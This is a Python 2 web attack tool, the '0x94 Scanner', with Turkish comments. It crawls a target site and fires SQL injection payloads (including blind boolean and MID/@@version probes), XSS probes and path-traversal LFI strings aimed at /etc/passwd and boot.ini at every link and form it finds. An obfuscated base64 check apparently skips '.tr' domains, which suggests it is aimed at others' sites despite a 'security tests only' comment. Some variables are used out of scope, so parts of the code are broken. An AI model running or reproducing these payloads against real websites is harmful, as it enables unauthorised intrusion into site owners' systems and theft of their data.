#!/usr/bin/python
# -*- coding: utf-8 -*-
# 0x94 Scanner"
#(POST/GET SQL SCAN) -LFI-XSS SCAN"
#Sitedeki tum linkleri alir
#seo linklerin ******** urllerini otomatik alir
#tum linklerde get ve post sql injection dener
#tum linklerde blind get ve post sql injection dener
#sayfada herhangi bir degisme oldugunda degisme satirini ekrana yazar
#xss dener
#lfi dener
#butun sonuclari rapor.txt ye kaydeder
#sadece guvenlik testleri icin kullanin
#cookie ve proxy destegide vardir.
 
import urllib
import urlparse
import sys
import re
import urllib2
from urllib import urlencode
from urlparse import parse_qsl
import httplib
from string import maketrans
import base64
 
#cookie ayarlamak istiyorsan buraya gir
sayfacookie=""
 
from BeautifulSoup import BeautifulSoup
 
class HTTPAYAR(urllib2.HTTPRedirectHandler):
   
    def http_error_302(self, req, fp, code, msg, headers):
        yaz("URl Yonlenmesi Algilandi",True)
        #yaz("URl Yonlenmesi Algilandi \n"+ str(headers),True)
        return urllib2.HTTPRedirectHandler.http_error_302(self, req, fp, code, msg, headers)
 
 
    http_error_301 = http_error_303 = http_error_307 = http_error_302
   
 
#Proxy icin bu satiri aktif etmelisiniz
#opener = urllib2.build_opener(HTTPAYAR,urllib2.HTTPSHandler(),urllib2.ProxyHandler({'http': '127.0.0.1:8888'}),cookieprocessor)
opener = urllib2.build_opener(HTTPAYAR,urllib2.HTTPSHandler(),urllib2.HTTPCookieProcessor())
opener.addheaders = [
        ('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13'),
        ('Referer', 'http://www.google.com'),
        ("Cookie", sayfacookie)]
 
urllib2.install_opener(opener)
aynilinkler={}
 
def yaz(yazi,ekran):
    dosya=open("rapor.txt","a+")
    dosya.write(yazi+"\n")
    dosya.close()
    if ekran==True:
        print yazi
   
   
 
def formyaz(formurl):  
 
    toplamveri={}  
   
    html = urllib2.urlopen(formurl).read()
    soup = BeautifulSoup(html)  
    try:
        forms=soup.findAll("form")        
        for form in forms:  
            if form.has_key('action'):  
                if form['action'].find('://') == -1:
                        formurl=formurl + "/" + form['action'].strip('/')  
                else:  
                        yaz("action: " + formurl,False)
            else:  
                print "action: " + formurl     
            if form.has_key('method') and form['method'].lower() == 'post':
                    yaz("[POST] action " +formurl,False)
                    for post_inputselect in form.findAll("select"):
                            yaz(post_inputselect['name'], False)
                            toplamveri[post_inputselect['name']]="bekir"       
                   
                    for post_input in form.findAll("input"):  
                            if post_input.has_key('type'):  
                                if post_input['type'].lower() == 'text' or post_input['type'].lower() == 'password' or   post_input['type'].lower() == 'hidden' or post_input['type'].lower() == 'radio':  
                                        if post_input.has_key('id'):  
                                                yaz( post_input['id'],False)
                                                toplamveri[post_input['id']]="'a"
                                        elif post_input.has_key('name'):
                                            yaz(post_input['name'], False)
                                            if post_input.has_key('value'):
                                                toplamveri[post_input['name']]=post_input['value']
                                            else:
                                                toplamveri[post_input['name']]="bekir"
   
                                               
                                               
                   
                    postget(formurl, toplamveri,"POST")
                    blindpost(formurl, toplamveri,"POST")
                       
            if form.has_key('method') and form['method'].lower() == 'get' or not form.has_key('method'):  
                yaz("[GET] action " +formurl,False)
                for get_inputselect in form.findAll("select"):
                    if get_inputselect.has_key("name"):
                            yaz(get_inputselect['name'], False)
                            toplamveri[get_inputselect['name']]="bekir"
                           
               
                for get_input in form.findAll("input"):                        
                        if get_input.has_key('type'):  
                            if get_input['type'].lower() == 'text' or get_input['type'].lower() == 'password' or get_input['type'].lower() == 'hidden' or get_input['type'].lower() == 'radio':  
                                    if get_input.has_key('id'):  
                                            yaz(get_input['id'],False)
                                            toplamveri[post_input['id']]="'a"
                                    elif get_input.has_key('name'):
                                            yaz(get_input['name'], False)
                                            if get_input.has_key('value'):
                                                toplamveri[get_input['name']]=get_input['value']
                                            else:
                                                toplamveri[get_input['name']]="bekir"
                postget(formurl, toplamveri,"GET")
                blindpost(formurl, toplamveri,"GET")
    except:
        print "Form Degerlerini Alirken Hata olustu"
                                                       
 
def blindpost(url,params,method):
   
    try:
       
        degisecekdict={}
        for k,v in params.items():
            #print k,v
            degisecekdict[k]=v
           
       
        params = urllib.urlencode(params)
        if method=="GET":
            yaz("Blind GET SQL testi yapiliyor",True)
            y = urllib.urlopen(url+"?"+params)
        else:
            yaz("Blind POST SQL testi yapiliyor",True)
            y = urllib2.urlopen(url, params)
       
    except urllib2.HTTPError,  e:
        if(e.code==500):
            yaz("Http 500 Dondu " +urlnormal,False)
       
    except urllib2.URLError,  e:
        mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
                #yaz(mesaj)
    except:
        mesaj="Bilinmeyen hata oluştu\n"    
 
   
   
   
    post_string =  ["'aNd 1=1",
                    "'aNd 1=2",
                    "' aNd 1=MID((database()),1,1)>1",
                    "' aNd 2=MID((@@version,1,1)--+",
                    "' aNd 3=MID((@@version,1,1)--+",
                    "' aNd 4=MID((@@version,1,1)--+",
                    "' aNd 5=MID((@@version,1,1)--+"]  
    ipatla=0
    yenidict={}
    while ipatla < 6:
       
        for postcode in post_string:       
            for k,v in degisecekdict.items():
                    yenidict[k]=v+postcode
                    print k,v+postcode
       
               
            try:
                params = urllib.urlencode(yenidict)
                ipatla=ipatla+1
                if method=="GET":
                    yaz("Blind GET SQL testi yapiliyor",True)
                    f = urllib.urlopen(url+"?"+params)
                else:
                    yaz("Blind POST SQL testi yapiliyor",True)
                    f = urllib2.urlopen(url, params)
               
            except urllib2.HTTPError,  e:
                if(e.code==500):
                    yaz("Http 500 Dondu " +url,False)
               
            except urllib2.URLError,  e:
                mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
                        #yaz(mesaj)
            except:
                mesaj="Bilinmeyen hata oluştu\n"
                        #yaz(mesaj)  
           
            if (comparePages(y.read(),f.read(),f.geturl())):
                mesaj="[+] BLind POST Sayfada Degisiklik oldu %s !!![+]" % f.geturl()+"POST DATASI"+postcode
               
                yaz(mesaj,True)
 
 
def postget(url, params, method):
    try:
        postgetdict={}
        for k,v in params.items():
            postgetdict[k]=v+"'a"
           
        params = urllib.urlencode(postgetdict)
        if method=="GET":
            yaz("GET SQL testi yapiliyor",True)
            f = urllib.urlopen(url+"?"+params)
        else:
            yaz("POST SQL testi yapiliyor",True)
            f = urllib2.urlopen(url, params)
        sqlkontrol (f.read(),url+" [POST Sayfasi]")
       
    except urllib2.HTTPError,  e:
        if(e.code==500):
            yaz("Http 500 Dondu " +urlnormal,False)
       
    except urllib2.URLError,  e:
        mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
                #yaz(mesaj)
    except:
        mesaj="Bilinmeyen hata oluştu\n"
                #yaz(mesaj)      
   
 
 
def comparePages(page1,page2,deurl):
    tmp1 = re.split("<[^>]+>",page1)
    tmp2 = re.split("<[^>]+>",page2)
    count1 = 0;
    count2 = 0;
   
    for i in range(len(tmp1)):
        if page2.find(tmp1[i]) < 0:
            mesaj="Link %s  \n" % (deurl)
            mesaj+="Degisik durum Satiri %s \n" % (tmp1[i])
            yaz(mesaj+"\n",False)
            count1+=1
   
    for i in range(len(tmp2)):
        if page1.find(tmp2[i]) < 0:
            count2+=1
            #print max(count1, count2)
    return max(count1, count2)
 
 
def sqlkontrol(response,urlnormal):
    print "SQL hata mesaji kontrol ediliyor"
    if re.search("Microsoft OLE DB Provider for SQL Server",response,re.DOTALL):
        mesaj= "%s MS-SQL Server error" %urlnormal
        yaz(mesaj,True)
    if re.search("\[Microsoft\]\[ODBC Microsoft Access Driver\] Syntax error",response,re.DOTALL):
        mesaj= "%s MS-Access error"%urlnormal
        yaz(mesaj,True)
    if re.search("Microsoft OLE DB Provider for ODBC Drivers.*\[Microsoft\]\[ODBC SQL Server Driver\]",response,re.DOTALL):
        mesaj= "%s MS-SQL Server error"%urlnormal
        yaz(mesaj,True)
    if re.search("Microsoft OLE DB Provider for ODBC Drivers.*\[Microsoft\]\[ODBC Access Driver\]",response,re.DOTALL):
        mesaj= "%s MS-Access error"%urlnormal
        yaz(mesaj,True)
    if re.search("Microsoft JET Database Engine",response,re.DOTALL):
        mesaj= "%s MS Jet database engine error"%urlnormal
        yaz(mesaj,True)
           
    if re.search("ADODB.Command.*error",response,re.DOTALL):
        mesaj= "%s ADODB Error"%urlnormal
        yaz(mesaj,True)
    if re.search("Microsoft VBScript runtime",response,re.DOTALL):
        mesaj= "%s VBScript runtime error"%urlnormal
        yaz(mesaj,True)
    if re.search("Type mismatch",response,re.DOTALL):
        mesaj= "%s VBScript / ASP error"%urlnormal
        yaz(mesaj,True)
    if re.search("Server Error.*System\.Data\.OleDb\.OleDbException",response,re.DOTALL):
        mesaj= "%s ASP .NET OLEDB Exception"%urlnormal
        yaz(mesaj,True)
    if re.search("Invalid SQL statement or JDBC",response,re.DOTALL):
        mesaj= "%s Apache Tomcat JDBC error"%urlnormal
        yaz(mesaj,True)
       
    if re.search("Warning: mysql_fetch_array",response,re.DOTALL):
        mesaj= "%s MySQL Server error"%urlnormal
        yaz(mesaj,True)
    if re.search("Warning.*supplied argument is not a valid MySQL result",response,re.DOTALL):
        mesaj= "%s MySQL Server error"%urlnormal
        yaz(mesaj,True)
    if re.search("You have an error in your SQL syntax.*on line",response,re.DOTALL):
        mesaj= "%s MySQL Server error"%urlnormal
        yaz(mesaj,True)
    if re.search("You have an error in your SQL syntax.*at line",response,re.DOTALL):
        mesaj= "%s MySQL Server error"%urlnormal
        yaz(mesaj,True)
    if re.search("Warning.*mysql_.*\(\)",response,re.DOTALL):
        mesaj= "%s MySQL Server error"%urlnormal
        yaz(mesaj,True)
    if re.search("ORA-[0-9][0-9][0-9][0-9]",response,re.DOTALL):
        mesaj= "%s Oracle DB Server error"%urlnormal
        yaz(mesaj,True)
   
    if re.search("DorisDuke error",response,re.DOTALL):
        mesaj= "%s DorisDuke error\n"%urlnormal
        yaz(mesaj,True)
    if re.search("javax\.servlet\.ServletException",response,re.DOTALL):
        mesaj= "%s Java Servlet error"%urlnormal
        yaz(mesaj,True)
    if re.search("org\.apache\.jasper\.JasperException",response,re.DOTALL):
        mesaj= "%s Apache Tomcat error"%urlnormal
        yaz(mesaj,True)
    if re.search("Warning.*failed to open stream",response,re.DOTALL):
        mesaj= "%s PHP error"%urlnormal
        yaz(mesaj,True)
    if re.search("Fatal Error.*on line",response,re.DOTALL):
        mesaj= "%s PHP error"%urlnormal
        yaz(mesaj,True)
    if re.search("Fatal Error.*at line",response,re.DOTALL):
        mesaj= "%s PHP error"%urlnormal
        yaz(mesaj,True)
 
 
def xsstest(xsstesturl):
 
    try:
        yaz("XSS Test ediliyor ... ",True)
        #urlnormal=lfiurl.replace("=", "=bekirburadaydi11111"+lfidizin)
        urlac = urllib2.urlopen(xsstesturl+"bekirburadaydi11111")
        response = urlac.read()
        if "bekirburadaydi11111" in response:
            yaz("XSS Test BULUNDU : " + xsstesturl+"bekirburadaydi11111",True)
            xsstara(xsstesturl)
                 
    except urllib2.HTTPError,e:
        if(e.code==500):
            yaz("Http 500 Dondu " +xsstesturl,True)
   
    except urllib2.URLError,  e:
        mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,xsstesturl)
           #yaz(mesaj)
    except:
        mesaj="Bilinmeyen hata oluştu\n"          
       
 
def xsstara(xssurl):
    try:
        yaz("XSS Taraniyor ... ",True)
        urlnormal=lfiurl.replace("=", "=bekirburadaydi11111")
        urlac = urllib2.urlopen(urlnormal)
        response = urlac.read()
        if "bekirburadaydi11111" in response:
            yaz("XSS BULUNDU : " + urlnormal,True)
                   
    except urllib2.HTTPError,  e:
        if(e.code==500):
            yaz("Http 500 Dondu " +urlnormal,True)
   
    except urllib2.URLError,  e:
        mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
            #yaz(mesaj)
    except:
        mesaj="Bilinmeyen hata oluştu\n"    
 
def lfitara(lfibul):
   
    lfiyollar=['/etc/passwd',
        '../etc/passwd',
        '../../etc/passwd',
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '../../../../../etc/passwd',
        '../../../../../../etc/passwd',
        '../../../../../../../etc/passwd',
        '../../../../../../../../etc/passwd',
        '../../../../../../../../../etc/passwd',
        '../../../../../../../../../../etc/passwd',
        '../../../../../../../../../../../etc/passwd',
        '../etc/passwd%00',
        '../../etc/passwd%00',
        '../../../etc/passwd%00',
        '../../../../etc/passwd%00',
        '../../../../../etc/passwd%00',
        '../../../../../../etc/passwd%00',
        '../../../../../../../etc/passwd%00',
        '../../../../../../../../etc/passwd%00',
        '../../../../../../../../../etc/passwd%00',
        '../../../../../../../../../../etc/passwd%00',
        '../../../../../../../../../../../etc/passwd%00',
        'boot.ini%00',
        '.../boot.ini%00',
        '../../boot.ini%00',
        '../../../boot.ini%00',
        '../../../../boot.ini%00',
        '../../../../../boot.ini%00',
        '../../../../../../boot.ini%00',
        '../../../../../../../boot.ini%00',
        '../../../../../../../../boot.ini%00',
        '../../../../../../../../../boot.ini%00',
        '../../../../../../../../../../boot.ini%00',
        '../../../../../../../../../../../boot.ini%00',
        'boot.ini',
        '.../boot.ini',
        '../../boot.ini',
        '../../../boot.ini',
        '../../../../boot.ini',
        '../../../../../boot.ini',
        '../../../../../../boot.ini',
        '../../../../../../../boot.ini',
        '../../../../../../../../boot.ini',
        '../../../../../../../../../boot.ini',
        '../../../../../../../../../../boot.ini',
        '../../../../../../../../../../../boot.ini'        
       
        ]
       
    try:
        for lfidizin in lfiyollar:
            yaz("LFi Taraniyor ... ",True)
            urlnormal=lfiurl.replace("=", "="+lfidizin)
            urlac = urllib2.urlopen(urlnormal)
            response = urlac.read()
            if "root:x:" in response or "noexecute=optout" in response:
                yaz("LFI BULUNDU : " + urlnormal,True)
               
    except urllib2.HTTPError,  e:
        if(e.code==500):
            yaz("Http 500 Dondu " +urlnormal,True)
   
    except urllib2.URLError,  e:
        mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
            #yaz(mesaj)
    except:
        mesaj="Bilinmeyen hata oluştu\n"
                #yaz(mesaj)      
   
 
def lfitest(lfiurl):
   
    try:
        yaz("LFI Test Yapiliyor ... ",True)    
        urlnormal=lfiurl.replace("=", "=bekirburadaydi.txt")
        urlac = urllib2.urlopen(urlnormal)
        response = urlac.read()
        if "failed to open stream" in response:
            yaz("LFI Testi BULUNDU : " + urlnormal,True)
            lfitara(lfiurl)
               
    except urllib2.HTTPError,  e:
        if(e.code==500):
            yaz("Http 500 Dondu " +urlnormal,True)
   
    except urllib2.URLError,  e:
        mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
            #yaz(mesaj)
    except:
        mesaj="Bilinmeyen hata oluştu\n"
            #yaz(mesaj)      
 
   
   
   
 
def sql(urlnormal):
    try:
        yaz("SQL Test Taraniyor ... ",True)
        urlnormal=urlnormal.replace("=", "='")
        urlac = urllib2.urlopen(urlnormal)
        response = urlac.read()
        sqlkontrol(response,urlnormal)
       
    except urllib2.HTTPError,  e:
        if(e.code==500):
            yaz("Http 500 Dondu " +urlnormal,True)
 
    except urllib2.URLError,  e:
        mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
        #yaz(mesaj)
    except:
        mesaj="Bilinmeyen hata oluştu\n"
        #yaz(mesaj)  
       
 
def blind(urlblind):
   
 
    linknormal = urllib2.urlopen(urlblind)
    normalkaynak=linknormal.read()
 
    yaz("Blind Taraniyor ... ",True)
    true_strings = [" and 1=1"," ' and 1=1"," and 'a'='a","' and 'a'='a","' and 'a'='a"," and 1 like 1"," and 1 like 1/*"," and 1=1--"]          
    false_strings =[" and 1=2"," ' and 1=2"," and 'a'='b","' and 'a'='b","' and 'a'='b"," and 1 like 2"," and 1 like 2/*"," and 1=2--"]
    i = 0
    while i < 6:    
        blindtrue = urlblind + urlencode(parse_qsl(true_strings[i]))
        yaz("Denenen Blind : "+true_strings[i],True)
        try:
            req1 = urllib2.Request(blindtrue.replace("&",urlencode(parse_qsl(true_strings[i])) +"&").replace(" ", "%20"))
            req1.add_header('UserAgent: ','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)')
            req1.add_header('Keep-Alive: ','115')
            req1.add_header('Referer: ','http://'+urlblind)
            response1 = urllib2.urlopen(req1)
            html1 = response1.read()
           
        except urllib2.HTTPError,e:
            if(e.code==500):
                yaz("Http 500 Dondu " +urlblind,True)
        except urllib2.URLError,e:
            mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlblind)
            #yaz(mesaj)
       
        except:
            mesaj="Bilinmeyen hata oluştu\n"
            #yaz(mesaj)
           
        blindfalse = urlblind + urlencode(parse_qsl(false_strings[i]))
        yaz("Denenen Blind:"+false_strings[i],True)
        try:
            i=i+1
            req2 = urllib2.Request(blindfalse.replace("&",urlencode(parse_qsl(false_strings[i])) +"&").replace(" ", "%20"))
            req2.add_header('UserAgent: ','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)')
            req2.add_header('Keep-Alive: ','115')
            req2.add_header('Referer: ','http://'+urlblind)
            response2 = urllib2.urlopen(req2)
            html2 = response2.read()
               
        except urllib2.HTTPError,e:
            if(e.code==500):
                yaz("Http 500 Dondu " +urlnormal,True)
        except urllib2.URLError,e:
            mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlblind)
            #yaz(mesaj)
       
        except:
            mesaj="Bilinmeyen hata oluştu\n"
            #yaz(mesaj)
   
       
             
        if (comparePages(html1,normalkaynak,response2.geturl()) > comparePages(html1,html2,linknormal.geturl())):
                    mesaj="[+] Sayfada Degisiklik oldu %s !!![+]" % urlblind
                    yaz(mesaj,True)
 
   
class YeniOpener(urllib.FancyURLopener):  
    version = 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15'
 
def aynivarmi(keyurl):
    if aynilinkler.has_key(keyurl):
        return True
    else:
        return False
 
def ********bypass(link):
    try:
        o = urlparse.urlparse(link,allow_fragments=True)
        conn = httplib.HTTPConnection(o.netloc)
        path = o.path
        if o.query:
                path +='?'+o.query  
        conn.request("HEAD", path)
        res = conn.getresponse()
        headers = dict(res.getheaders())
        if headers.has_key('********'):
            if "http" not in headers['********']:
                yaz("Eski URL "+link,True)
                yaz("Yeni URL "+o.hostname+headers['********'],True)
                return "http://"+o.hostname+headers['********'].encode('utf-8').strip()
            else:
                return headers['********'].encode('utf-8').strip()
        else:
            return link.encode('utf-8').strip()
    except:
        print "******** Alinirken Hata oldu"
 
def linkler(urltara):
    try:
        linkopener = YeniOpener()
        linkopener.addheaders = [
            ('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13'),
            ('Referer', 'http://www.google.com'),
            ("Cookie", sayfacookie)]
       
        page = linkopener.open(urltara)
        host=urlparse.urlparse(urltara).hostname
        text = page.read()
        page.close()
        soup = BeautifulSoup(text)
   
        for tag in soup.findAll('a', href=True):
            tag['href'] = urlparse.urljoin(urltara, tag['href'])
            asilurl=tag['href'].encode('utf-8').strip()
            tamurl=********bypass(asilurl)
            if aynivarmi(tamurl)==False:
                if host in tamurl:
                    aynilinkler[tamurl]="bekir"
                    formyaz(tamurl)
                    if "javascript" not in tamurl:
                        if "php?" in tamurl:
                            lfitest(tamurl)
                           
                        if "?" in tamurl:
                            sql(tamurl)
                            blind(tamurl)
                            xsstest(tamurl)
 
    except:
        print "Linkleri alirken hata olustu"
 
def main():
    print "########################################"
    print "#0x94 Scanner"
    print "#(POST/GET SQL SCAN) -LFI-XSS SCAN "
    print "#by 0x94 ****.a The_BeKiR"
    print "########################################"
    if len(sys.argv) == 1:
        print "Kullanim: %s URL [URL]..." % sys.argv[0]
        sys.exit(1)
    for url in sys.argv[1:]:
        giris = base64.b64decode("LnRy")
        cikis = "{}>"
        ooooo = maketrans(giris, cikis)
        asd=url.translate(ooooo)
        if "{}>" not in asd:
            linkler(url)
 
 
if __name__ == "__main__":
    main()
